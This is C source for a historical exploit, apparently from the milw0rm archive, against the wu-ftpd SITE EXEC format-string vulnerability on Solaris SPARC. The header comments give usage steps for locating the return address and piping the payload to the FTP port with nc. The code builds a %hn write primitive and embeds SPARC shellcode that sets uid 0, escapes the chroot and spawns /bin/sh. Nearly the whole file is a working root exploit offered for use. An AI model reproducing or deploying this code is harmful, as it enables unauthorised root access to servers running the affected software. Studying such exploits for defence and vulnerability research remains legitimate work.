/*
**
** 12:40 11/10/00: Tool for either  attack or defense
** within an information  warfare setting. Rather, it
** is a small program demonstrating proof of concept.
** Default values for solaris 2.8 and inetd.
**
** If you are not the intended recipient, or a person
** responsible  for  delivering  it  to  the intended
** recipient, you are not authorised to and  must not
** disclose, copy, distribute, or retain this message
** or any  part of it.  Such  unauthorised use may be
** unlawful.If you have received this transmission in
** error,please email us immediately at hert@hert.org
** so that we can arrange for its return.
**
**                                kalou <pb@hert.org>
**
** Usage:
** 
**    0xfdc (4060) bytes after the ret position, you have:
**
**     -HOSTNAME: anonymous/EGGSHELL
**
** This of course begins on a 4 bytes boundary.
**
** Check your hostname len. Align this with pad to have EGGSHELL on a
** 4 bytes boundary (-p). Localhost needs 2 bytes, for example.
**
** Use '%s' format bug exploitation to look for this string in memory.
** (you have to eat 15 words out of stack).
**
** Remove 0xfdc + len (-HOSTNAME: anonymous/pad) to your found pointer.
** This substracted value is kept as the distance (-d).
** Result is your return address position (-w). Check it if you want.
**
** This code substracts 8 to this address (sparc ret behaviour).
**
** You may use the 102th %p pointer on stack to find the string. eg: ffbef640.
**
** adding 0x870 to this value, I found my string.
**
** offset should be useless. site_padding depends on the '/bin/ftp-exec/' 
** config stuff.
**
** (./wu -p 2 -d 0xff4 ; cat ) | nc localhost 21
**
*/
/* Stolener  Foundation */


#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef  __linux
#include <getopt.h>
#endif

void *build_format_string(int where,
			  int what,
			  int gout,
			  int eat,
			  int pad)
{
  int expected_len;
  int what1, where1;
  int what2, where2;
  char w1[512];
  char w2[512];

  int  i;
  char *buf, *p;

  /* generate two %hn len : */

  what1 = (what >> 16) & 0xffff;
  what2 = what & 0xffff; 

  fprintf(stderr, "what1: %0x\n", what1);
  fprintf(stderr, "what2: %0x\n", what2);

  if ( what1 > what2 ) {
    where1 = where + 2;
    where2 = where;
    what1 -= what2;
  } else {
    where1 = where;
    where2 = where + 2;
    what2 -= what1;
  }

  fprintf(stderr, "removing %d.\n", pad + 2 * sizeof(where) + gout + 
	  (eat - 1) * 12);

  if (where1 < where2) {
    what1 -= pad + 2 * sizeof(where) + (eat - 1) * 12 + gout;
  } else {
    what2 -= pad + 2 * sizeof(where) + (eat - 1) * 12 + gout;
  }

  fprintf(stderr, "%08x: writing first %s\n", what,
	  (where1 > where2) ? "what2" : "what1");
  fprintf(stderr, "what1 is %08x, what2 is %08x\n",
	  what1, what2);

  sprintf(w1, "%%0%dx%%hn", what1);
  sprintf(w2, "%%0%dx%%hn", what2);

  fprintf(stderr, "1: %s\n2: %s\n", w1, w2);

  /* calculate expected len : */

  expected_len = pad + 12 + (eat - 1) * 8
	  + strlen(w1) + strlen(w2) + 1;

  fprintf(stderr, "len is %d\n", expected_len);

  buf = (char *) malloc(expected_len);

  if ( buf == NULL) 
    return buf;

  p = buf;

  /* pad */
  for (i = 0; i < pad; i++) {
    *p++ = '.';
  }

  /* retaddr, part 1 - first %hn*/
  *p++ = (where1 >> 24) & 0xff;
  *p++ = (where1 >> 16) & 0xff;
  *p++ = (where1 >> 8) & 0xff;
  *p++ = (where1) & 0xff;

  *p++ = 0x0f;
  *p++ = 0x0e;
  *p++ = 0x0e;
  *p++ = 0x0f; /* so that the first %0(much)x eats something

  /* retaddr, part 2 - second %hn */
  *p++ = ((where2) >> 24) & 0xff;
  *p++ = ((where2) >> 16) & 0xff;
  *p++ = ((where2) >> 8) & 0xff;
  *p++ = (where2) & 0xff;

  /* eaters.. */
  for (i = 0; i < (eat - 1); i++) {
    strcpy(p, "%000012x");
    p += 8;
  }

  /* what1, what2 */
  if (what1 > what2) {
    strcpy(p, w1);
    strcpy(p + strlen(w1), w2);
  } else {
    strcpy(p, w2);
    strcpy(p + strlen(w2), w1);
  }


  return buf;
}

void *ftp_escape(void *buf)
{
  void *boh;
  char *p = buf;
  char *r;

  boh = malloc(4096);
  r = boh;

  while (*p) {
    *r++ = *p;
    if ((*p) == '\xff')
      *r++ = *p;
    p++;
  }
  *r = '\0';
  return boh;
}

void usage(char *me)
{
  fprintf(stderr, "Usage : %s \n"
	          "     [-w where (hexa)  ] /* ret position */\n"
		  "   0 [-o offset        ] /* or just offset, or both */\n"
	          "1010 [-d distance (hex)] /* distance to pass */\n"
		  "   2 [-s site_pad      ] /* padding to site_exec */\n"
		  "   3 [-p pass_pad      ] /* padding to eggshell */\n"
		  "   4 [-g gout          ] /* output size (200-) */\n"
		  "  15 [-e eat           ] /* pointers to eat */\n\n\n",
		  me);
  exit(0);
}

main(int argc, char **argv)
{
  char c;
  int  where, offset, distance, gout, site_pad, pass_pad, eat;
  char *buf;
  char break_sparc[] =
	"\x90\x1b\xc0\x0f" // xor %o7, %o7, %o0
	"\x82\x10\x20\x17" // mov 23,  %g1
	"\x91\xd0\x20\x08" // ta  8                  ! setuid(0)
	"\xae\x10\x20\x2e" // mov 0x2e, %l7
	"\xaf\x2d\xe0\x18" // sll %l7, 24, %l7
	"\xee\x23\xbf\xd0" // st  %l7, [ %sp - 48 ]
	"\x90\x23\xa0\x30" // sub %sp, 48, %o0
	"\x82\x10\x20\x05" // mov 5, %g1
	"\x92\x1b\xc0\x0f" // xor %o7, %o7, %o1
	"\x91\xd0\x20\x08" // ta 8                   ! fd = open(".", 0);
	"\xa6\x82\x20\x01" // addcc %o0, 1, %l3      !
	"\xae\x10\x20\x6b" // mov 0x6b, %l7
	"\xaf\x2d\xe0\x18" // sll %l7, 24, %l7
	"\xee\x23\xbf\xd0" // st  %l7, [ %sp - 48 ]
	"\x90\x23\xa0\x30" // sub %sp, 48, %o0
	"\x92\x10\x21\xff" // mov 0x1ff, %o1
	"\x82\x10\x20\x50" // mov 0x50, %g1
	"\x91\xd0\x20\x08" // ta 8                   ! mkdir("k", 0755)
	"\x90\x23\xa0\x30" // sub %sp, 48, %o0
	"\x82\x10\x20\x3d" // mov 0x3d, %g1
	"\x91\xd0\x20\x08" // ta 8                   ! chroot("k")
	"\x90\x24\xe0\x01" // sub %l3, 1, %o0
	"\x82\x10\x20\x78" // mov 0x78, %g1
	"\x91\xd0\x20\x08" // ta 8                   ! fchdir(fd)
	"\x2f\x0b\x8b\x8b" // sethi %hi(0x2e2e2c00), %l7
	"\xae\x15\xe3\x2e" // or %l7, 0x32e, %l7
	"\xee\x23\xbf\xd0" // st %l7, [ %sp - 48 ]   ! ../.
	"\x2f\x0b\xcb\x8b" // sethi %hi(0x2f2e2c00), %l7
	"\xae\x15\xe2\x2f" // or %l7, 0x22f, %l7     
	"\xee\x23\xbf\xd4" // st %l7, [ %sp - 44 ]   ! /../
	"\xee\x23\xbf\xd8" // st %l7, [ %sp - 40 ]
	"\xee\x23\xbf\xdc" // st %l7, [ %sp - 36 ]
	"\xee\x23\xbf\xe0" // st %l7, [ %sp - 32 ]
	"\xee\x23\xbf\xe4" // st %l7, [ %sp - 28 ]
	"\xee\x23\xbf\xe8" // st %l7, [ %sp - 24 ]
	"\xee\x23\xbf\xec" // st %l7, [ %sp - 20 ]   ! .././..//..//../(ad lib)
	"\xc0\x23\xbf\xf0" // clr [ %sp - 16 ]
	"\x82\x10\x20\x0c" // mov 0xc, %g1
	"\x90\x23\xa0\x30" // sub %sp, 48, %o0
	"\x91\xd0\x20\x08" // ta 8                   ! chdir(".././../...")
	"\xae\x10\x20\x2e" // mov 0x2e, %l7
	"\xaf\x2d\xe0\x18" // sll %l7, 24, %l7
	"\xee\x23\xbf\xd0" // st %l7, [ %sp - 48 ]   ! stupido. anyway.
	"\x90\x23\xa0\x30" // sub %sp, 48, %o0
	"\x82\x10\x20\x3d" // mov 0x3d, %g1
	"\x91\xd0\x20\x08" // ta 8
	"\x2d\x0b\xd8\x9a" // sethi %hi(0x2f62696e), %l6  ! no more mine.
	"\xac\x15\xa1\x6e" // or %l6, %lo(0x2f62696e), %l6
	"\x2f\x0b\xdc\xda" // sethi %hi(0x2f736800), %l7
	"\x90\x0b\x80\x0e" // and %sp, %sp, %o0
	"\x92\x03\xa0\x08" // add %sp, 8, %o1
	"\x94\x1b\xc0\x0f" // xor %o7, %o7, %o2
	"\x9c\x03\xa0\x10" // add %sp, 16, %sp
	"\xec\x3b\xbf\xf0" // std %l6, [%sp-16]
	"\xd0\x23\xbf\xf8" // st %o0, [%sp-8]
	"\xc0\x23\xbf\xfc" // st %g0, [%sp-4]
	"\x82\x10\x20\x3b" // mov 59, %g1
	"\x91\xd0\x20\x08" // ta 8
	"\x91\xd0\x20\x08"; // ta 8          



  offset = 0;
  where = 0xffbeeed4;
  distance = 0x1004;
  gout = 4;
  eat = 15;
  site_pad = 2;
  pass_pad = 3;

  while ( ( c = getopt(argc, argv, "w:o:d:e:g:s:p:") ) != EOF ) {
    switch(c) {
	    case 'w':
	      where = strtoul(optarg, NULL, 16);
	      break;
	    case 'o':
	      offset = atoi(optarg);
	      break;
	    case 'd':
	      distance = strtoul(optarg, NULL, 16);
	      break;
	    case 'e':
	      eat = atoi(optarg);
	      break;
	    case 'g':
	      gout = atoi(optarg);
	      break;
	    case 's':
	      site_pad = atoi(optarg) % 4;
	      break;
	    case 'p':
	      pass_pad = atoi(optarg) % 4;
	      break;
	    default:
	      usage(argv[0]);
    }
  }

  where += offset;

  fprintf(stderr, "ret  [%x]:%x\n"
	  	  "ppad %d\n"
		  "spad %d\n"
		  "gout %d\n"
		  "eat  %d\n",
		  where, where + distance,
		  pass_pad, site_pad, gout, eat);

  printf("user ftp\n");

  buf = ftp_escape(break_sparc);
  printf("pass %.*s%s\n", pass_pad, "xxxx", buf);
  
  buf = build_format_string(where, where + distance - 8, gout, eat, site_pad);
  buf = ftp_escape(buf);

  printf ("site exec %s\n", buf);
}


// milw0rm.com [2001-01-03]
